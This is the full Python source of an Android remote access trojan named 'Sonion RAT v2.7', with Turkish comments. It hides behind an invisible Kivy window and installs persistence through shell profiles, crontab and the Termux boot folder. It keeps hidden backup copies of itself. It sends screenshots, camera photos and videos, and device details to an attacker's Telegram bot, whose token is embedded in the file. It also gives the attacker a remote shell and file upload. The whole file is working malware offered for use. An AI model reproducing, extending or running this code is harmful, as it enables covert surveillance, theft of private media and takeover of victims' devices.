#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# Sonion RAT v2.7 – Tam Kod (APK Girişi)

import os
import sys
import time
import signal
import subprocess
import shutil
import tempfile
import json
import threading
import logging
from pathlib import Path
from datetime import datetime
from queue import Queue
from kivy.app import App
from kivy.uix.label import Label
from kivy.clock import Clock
from kivy.core.window import Window

# ========== BAĞIMLILIKLAR ==========
try:
    import requests
except:
    os.system("pip install requests")
    import requests

try:
    from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
    from telegram.ext import Application, CommandHandler, CallbackQueryHandler, MessageHandler, filters, ContextTypes
except:
    os.system("pip install python-telegram-bot==20.7")
    from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
    from telegram.ext import Application, CommandHandler, CallbackQueryHandler, MessageHandler, filters, ContextTypes

try:
    from PIL import Image, ImageOps
    Image.MAX_IMAGE_PIXELS = None
except:
    os.system("pip install Pillow")
    from PIL import Image, ImageOps
    Image.MAX_IMAGE_PIXELS = None

# ========== KULLANICI BİLGİLERİ (GÖMÜLÜ) ==========
BOT_TOKEN = "8645865536:AAGK8bt1oJnpLGUWm5CCw7_aAjsUtg7W9ag"
CHAT_ID   = "8782311623"

# ========== SABİTLER ==========
SCRIPT_PATH = Path(os.path.abspath(__file__))
SCRIPT_DIR = SCRIPT_PATH.parent
CONFIG_DIR = Path("/data/data/com.termux/files/home/.sonion_rat") if os.name == 'posix' else Path.home() / ".sonion_rat"
CONFIG_DIR.mkdir(parents=True, exist_ok=True)
OFFSET_FILE = CONFIG_DIR / "offset.dat"
LOCK_FILE = Path("/tmp/sonion_rat.lock")

BACKUP_PATHS = [
    Path("/data/data/com.termux/files/usr/bin/.sonion_rat_backup"),
    Path("/data/data/com.termux/files/home/.sonion_rat_hidden"),
    Path("/data/data/com.termux/files/usr/etc/.sonion_rat_rescue"),
]

PHOTO_SIZE = (600, 600)
PHOTO_QUALITY = 75
VIDEO_SCALE = "320:-2"
VIDEO_FPS = 2
VIDEO_CRF = 40
VIDEO_OPTS = "-an"
MAX_PHOTOS = 20
MAX_VIDEOS = 10

logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
                    handlers=[logging.FileHandler(CONFIG_DIR / "rat.log"), logging.StreamHandler()])
logger = logging.getLogger("SonionRAT")

# ========== OFFSET ==========
def load_offset():
    if OFFSET_FILE.exists():
        try:
            return int(OFFSET_FILE.read_text().strip())
        except:
            return 0
    return 0

def save_offset(offset):
    OFFSET_FILE.write_text(str(offset))

# ========== DAEMON (ÇİFT FORK) ==========
def daemonize():
    if os.fork() > 0:
        sys.exit(0)
    os.setsid()
    if os.fork() > 0:
        sys.exit(0)
    sys.stdout.flush()
    sys.stderr.flush()
    with open('/dev/null', 'r') as f:
        os.dup2(f.fileno(), sys.stdin.fileno())
    with open('/dev/null', 'w') as f:
        os.dup2(f.fileno(), sys.stdout.fileno())
        os.dup2(f.fileno(), sys.stderr.fileno())
    signal.signal(signal.SIGTERM, lambda s, f: sys.exit(0))
    signal.signal(signal.SIGINT, lambda s, f: None)
    signal.signal(signal.SIGHUP, lambda s, f: None)
    LOCK_FILE.write_text(str(os.getpid()))

# ========== KALICILIK ==========
def install_persistence():
    home = Path.home()
    for f in [home / ".bashrc", home / ".profile", home / ".zshrc", Path("/data/data/com.termux/files/usr/etc/profile")]:
        if f.exists():
            content = f.read_text()
            if str(SCRIPT_PATH) not in content:
                with f.open("a") as fp:
                    fp.write(f"\n# Sonion RAT\npython3 {SCRIPT_PATH} &\n")
    try:
        subprocess.run("crontab -l 2>/dev/null; echo '* * * * * python3 " + str(SCRIPT_PATH) + "' | crontab -", shell=True)
    except:
        pass
    boot_dir = Path("/data/data/com.termux/files/home/.termux/boot")
    boot_dir.mkdir(parents=True, exist_ok=True)
    boot_script = boot_dir / "sonion_rat.sh"
    boot_script.write_text(f"#!/bin/bash\npython3 {SCRIPT_PATH} &\n")
    boot_script.chmod(0o755)

def copy_backups():
    for dst in BACKUP_PATHS:
        try:
            shutil.copy2(SCRIPT_PATH, dst)
            dst.chmod(0o755)
        except:
            pass

def ensure_running():
    if not SCRIPT_PATH.exists():
        for src in BACKUP_PATHS:
            if src.exists():
                shutil.copy2(src, SCRIPT_PATH)
                SCRIPT_PATH.chmod(0o755)
                break
    else:
        copy_backups()

# ========== MEDYA İŞLEME ==========
def compress_image(src_path, dst_path):
    try:
        with Image.open(src_path) as img:
            img = ImageOps.exif_transpose(img)
            img.thumbnail(PHOTO_SIZE, Image.LANCZOS)
            if img.mode in ('RGBA', 'P'):
                img = img.convert('RGB')
            img.save(dst_path, 'JPEG', quality=PHOTO_QUALITY, optimize=True)
            return True
    except:
        return False

def compress_video(src_path, dst_path):
    cmd = ["ffmpeg", "-i", str(src_path), "-vf", f"scale={VIDEO_SCALE}", "-r", str(VIDEO_FPS),
           "-crf", str(VIDEO_CRF), "-preset", "ultrafast", VIDEO_OPTS, "-y", str(dst_path)]
    try:
        subprocess.run(cmd, check=True, capture_output=True)
        return True
    except:
        return False

def take_screenshot():
    out = tempfile.NamedTemporaryFile(suffix=".png", delete=False)
    out_path = Path(out.name)
    try:
        subprocess.run(["termux-screenshot", str(out_path)], check=True, timeout=10)
    except:
        try:
            subprocess.run(["screencap", "-p", str(out_path)], check=True, timeout=10)
        except:
            return None
    if out_path.exists() and out_path.stat().st_size > 0:
        return out_path
    return None

def scan_media(directory, max_count, extensions):
    files = []
    try:
        with os.scandir(directory) as it:
            for entry in it:
                if entry.is_file() and entry.name.lower().endswith(extensions):
                    files.append(Path(entry.path))
                if len(files) >= max_count * 2:
                    break
    except:
        pass
    return files[:max_count]

# ========== BİLGİ TOPLAMA ==========
def get_ip():
    try:
        out = subprocess.check_output(["ip", "addr", "show", "wlan0"], text=True)
        for line in out.splitlines():
            if "inet " in line:
                ip = line.strip().split()[1].split('/')[0]
                if ip:
                    return ip
    except:
        pass
    try:
        ip = subprocess.check_output(["hostname", "-I"], text=True).strip().split()[0]
        if ip:
            return ip
    except:
        pass
    try:
        ip = requests.get("https://ifconfig.me", timeout=5).text.strip()
        if ip:
            return ip
    except:
        pass
    return "0.0.0.0"

def get_battery():
    try:
        out = subprocess.check_output(["termux-battery-status"], text=True)
        data = json.loads(out)
        return data.get("percentage", "?")
    except:
        return "?"

def get_device_info():
    info = {}
    try:
        info["android"] = os.environ.get("ANDROID_VERSION", "?")
        model = subprocess.check_output(["getprop", "ro.product.model"], text=True).strip()
        info["model"] = model if model else "?"
        info["battery"] = get_battery()
        info["ip"] = get_ip()
        info["hostname"] = os.uname().nodename
    except:
        pass
    return info

# ========== SHELL YARDIMCILARI ==========
def run_shell(cmd):
    try:
        result = subprocess.run(cmd, shell=True, capture_output=True, text=True, timeout=60)
        return result.stdout + result.stderr
    except:
        return "Komut çalıştırılamadı."

def list_dir(path):
    p = Path(path)
    if not p.exists():
        return "Dizin yok."
    items = []
    for item in sorted(p.iterdir()):
        items.append(f"{'📁' if item.is_dir() else '📄'} {item.name}")
    return "\n".join(items) if items else "(boş)"

def delete_item(path):
    p = Path(path)
    if not p.exists():
        return "Dosya/klasör yok."
    try:
        if p.is_dir():
            shutil.rmtree(p)
        else:
            p.unlink()
        return "Silindi."
    except Exception as e:
        return f"Hata: {e}"

def copy_item(src, dst):
    try:
        shutil.copy2(src, dst)
        return "Kopyalandı."
    except Exception as e:
        return f"Hata: {e}"

def move_item(src, dst):
    try:
        shutil.move(src, dst)
        return "Taşındı."
    except Exception as e:
        return f"Hata: {e}"

def create_dir(path):
    try:
        Path(path).mkdir(parents=True, exist_ok=True)
        return "Klasör oluşturuldu."
    except Exception as e:
        return f"Hata: {e}"

def download_file(url, dest):
    try:
        r = requests.get(url, stream=True, timeout=30)
        with open(dest, 'wb') as f:
            for chunk in r.iter_content(8192):
                f.write(chunk)
        return f"İndirildi: {dest}"
    except Exception as e:
        return f"Hata: {e}"

# ========== TELEGRAM KOMUTLARI ==========
async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if str(update.effective_chat.id) != CHAT_ID:
        await update.message.reply_text("Yetkisiz.")
        return
    keyboard = [
        [InlineKeyboardButton("📸 Ekran Görüntüsü", callback_data="screenshot")],
        [InlineKeyboardButton("🖼 Galeri (Foto)", callback_data="photos"),
         InlineKeyboardButton("🎥 Galeri (Video)", callback_data="videos")],
        [InlineKeyboardButton("📁 İndirilenler", callback_data="downloads")],
        [InlineKeyboardButton("💻 Shell", callback_data="shell")],
        [InlineKeyboardButton("ℹ️ Bilgi", callback_data="info")],
        [InlineKeyboardButton("🔄 Reboot", callback_data="reboot"),
         InlineKeyboardButton("⏹ Stop", callback_data="stop"),
         InlineKeyboardButton("🗑 Uninstall", callback_data="uninstall")],
    ]
    reply_markup = InlineKeyboardMarkup(keyboard)
    await update.message.reply_text("🤖 **Sonion RAT v2.7 Aktif**\nAşağıdaki butonlardan seçin.",
                                    reply_markup=reply_markup, parse_mode='Markdown')

async def button_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    data = query.data
    chat_id = update.effective_chat.id
    if str(chat_id) != CHAT_ID:
        await query.edit_message_text("Yetkisiz.")
        return

    if data == "screenshot":
        await query.edit_message_text("📸 Ekran görüntüsü alınıyor...")
        sc = take_screenshot()
        if sc:
            with open(sc, 'rb') as f:
                await context.bot.send_photo(chat_id, f)
            sc.unlink()
        else:
            await query.edit_message_text("❌ Başarısız.")

    elif data == "photos":
        await query.edit_message_text("🖼 Taranıyor...")
        dcim = Path("/sdcard/DCIM/Camera")
        if not dcim.exists():
            await query.edit_message_text("❌ Klasör yok.")
            return
        files = scan_media(dcim, MAX_PHOTOS, ('.jpg','.jpeg','.png','.heic'))
        if not files:
            await query.edit_message_text("❌ Fotoğraf yok.")
            return
        await query.edit_message_text(f"📸 {len(files)} fotoğraf bulundu, gönderiliyor...")
        sent = 0
        for p in files:
            try:
                with tempfile.NamedTemporaryFile(suffix=".jpg", delete=False) as tmp:
                    dst = Path(tmp.name)
                if compress_image(p, dst):
                    with open(dst, 'rb') as f:
                        await context.bot.send_photo(chat_id, f, caption=f"{p.name}")
                    dst.unlink()
                    sent += 1
                time.sleep(0.5)
            except:
                pass
        await context.bot.send_message(chat_id, f"✅ {sent} fotoğraf gönderildi.")

    elif data == "videos":
        await query.edit_message_text("🎥 Taranıyor...")
        dcim = Path("/sdcard/DCIM/Camera")
        if not dcim.exists():
            await query.edit_message_text("❌ Klasör yok.")
            return
        files = scan_media(dcim, MAX_VIDEOS, ('.mp4','.mkv','.avi','.3gp','.mov'))
        if not files:
            await query.edit_message_text("❌ Video yok.")
            return
        await query.edit_message_text(f"🎞 {len(files)} video bulundu, gönderiliyor...")
        sent = 0
        for p in files:
            try:
                with tempfile.NamedTemporaryFile(suffix=".mp4", delete=False) as tmp:
                    dst = Path(tmp.name)
                if compress_video(p, dst):
                    with open(dst, 'rb') as f:
                        await context.bot.send_video(chat_id, f, caption=f"{p.name}")
                    dst.unlink()
                    sent += 1
                time.sleep(0.5)
            except:
                pass
        await context.bot.send_message(chat_id, f"✅ {sent} video gönderildi.")

    elif data == "downloads":
        d = Path("/sdcard/Download")
        if not d.exists():
            await query.edit_message_text("❌ İndirilenler yok.")
            return
        await query.edit_message_text(f"📁 İndirilenler:\n{list_dir(d)[:4000]}")

    elif data == "shell":
        await query.edit_message_text("💻 Shell komut gir (örn: ls -la)\n/cancel ile iptal.")
        context.user_data['shell_mode'] = True

    elif data == "info":
        info = get_device_info()
        msg = (f"ℹ️ **Cihaz Bilgisi**\nModel: {info.get('model','?')}\nAndroid: {info.get('android','?')}\n"
               f"Batarya: {info.get('battery','?')}%\nIP: {info.get('ip','?')}\nHostname: {info.get('hostname','?')}")
        await query.edit_message_text(msg, parse_mode='Markdown')

    elif data == "reboot":
        await query.edit_message_text("🔄 Yeniden başlatılıyor...")
        os.execl(sys.executable, sys.executable, *sys.argv)

    elif data == "stop":
        await query.edit_message_text("⏹ Durduruluyor.")
        sys.exit(0)

    elif data == "uninstall":
        await query.edit_message_text("🗑 Temizlik başlıyor...")
        try:
            shutil.rmtree(CONFIG_DIR)
        except:
            pass
        for f in BACKUP_PATHS:
            try:
                f.unlink()
            except:
                pass
        try:
            LOCK_FILE.unlink()
        except:
            pass
        try:
            SCRIPT_PATH.unlink()
        except:
            pass
        await context.bot.send_message(chat_id, "✅ Kaldırıldı.")
        sys.exit(0)

async def shell_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if str(update.effective_chat.id) != CHAT_ID or not context.user_data.get('shell_mode'):
        return
    if update.message.text and update.message.text.lower() == "/cancel":
        context.user_data['shell_mode'] = False
        await update.message.reply_text("Shell modu kapandı.")
        return
    cmd = update.message.text
    if not cmd:
        return
    await update.message.reply_text("⏳ Çalıştırılıyor...")
    output = run_shell(cmd)
    if len(output) > 4000:
        with tempfile.NamedTemporaryFile(mode='w', suffix=".txt", delete=False) as f:
            f.write(output)
            f.flush()
            with open(f.name, 'rb') as fb:
                await context.bot.send_document(update.effective_chat.id, fb, filename="output.txt")
            os.unlink(f.name)
    else:
        await update.message.reply_text(f"```\n{output[:4000]}\n```", parse_mode='MarkdownV2')

async def file_upload(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if str(update.effective_chat.id) != CHAT_ID:
        return
    doc = update.message.document
    if doc:
        file = await context.bot.get_file(doc.file_id)
        dest = Path("/sdcard/Download") / doc.file_name
        await file.download_to_drive(dest)
        await update.message.reply_text(f"✅ Kaydedildi: {dest}")

# ========== ANA BOT ==========
def main():
    install_persistence()
    copy_backups()
    ensure_running()
    if not LOCK_FILE.exists():
        daemonize()
    offset = load_offset()
    app = Application.builder().token(BOT_TOKEN).build()
    app.add_handler(CommandHandler("start", start))
    app.add_handler(CallbackQueryHandler(button_callback))
    app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, shell_message))
    app.add_handler(MessageHandler(filters.Document.ALL, file_upload))
    app.updater.start_polling(drop_pending_updates=True)
    logger.info("Bot başlatıldı, offset=%s", offset)
    try:
        app.updater.idle()
    except KeyboardInterrupt:
        pass
    finally:
        try:
            save_offset(app.updater.last_update_id + 1)
        except:
            pass
        app.updater.stop()

# ========== APK SERVİSİ ==========
def run_bot():
    try:
        main()
    except Exception as e:
        logger.error(f"Bot hatası: {e}")

class SonionService(App):
    def build(self):
        Window.size = (1, 1)
        Window.borderless = True
        Window.show_cursor = False
        t = threading.Thread(target=run_bot, daemon=True)
        t.start()
        Clock.schedule_once(lambda dt: self.stop(), 1)
        return Label(text="", opacity=0)

if __name__ == '__main__':
    SonionService().run()
